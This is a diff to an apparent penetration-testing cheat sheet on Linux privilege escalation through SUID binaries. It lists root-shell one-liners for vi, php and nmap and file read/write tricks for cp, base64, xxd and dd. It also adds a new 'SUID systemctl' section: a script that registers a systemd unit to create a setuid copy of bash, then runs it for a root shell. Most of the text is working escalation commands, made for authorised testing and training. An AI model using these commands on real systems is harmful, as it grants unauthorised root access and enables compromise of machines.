@@ -34,12 +34,22 @@ Owner must be root; confirm with `ls -l` first. Look up anything missing from th
 | `vi` / `vim` | `vi -c ':set shell=/bin/sh\ -p | shell'` |
 | `php` | `php -r 'pcntl_exec("/bin/sh", ["-p"]);'` |
 | `nmap` (2.02–5.21) | `nmap --interactive`, then `!sh` |
-| `systemctl` | unit-file trick, same as [sudo](sudo.md#common-sudo--gtfobins-one-liners-offline) minus `sudo -u` |
+| `systemctl` | link + enable a oneshot unit → [below](#suid-systemctl) |
 | `cp` / `base64` / `xxd` / `dd` | file read/write as root (no `-p` needed, no shell) |
 | `pkexec` | not a GTFOBins SUID entry: it's itself setuid root by design → [PwnKit](kernel-checks.md#known-cve-patterns) |
 
 - `perl` has no SUID shell in GTFOBins (only a `CAP_SETUID` capability path, below): don't expect `perl -e 'exec "/bin/sh"'` to keep root from a bare SUID bit.
 - Pager/editor rows need a real TTY: [stabilize the shell](../foothold/shells.md#stabilize-a-linux-tty) first.
+
+### SUID systemctl
+```bash
+TF=$(mktemp).service
+printf '[Service]\nType=oneshot\nExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"\n[Install]\nWantedBy=multi-user.target\n' > "$TF"
+systemctl link "$TF"
+systemctl enable --now "$TF"
+/tmp/rootbash -p
+```
+- Use the SUID `systemctl` path you found. Not started by `--now` → `systemctl start $(basename "$TF")`.
 
 ## What changes
 | Mechanism | Effect |
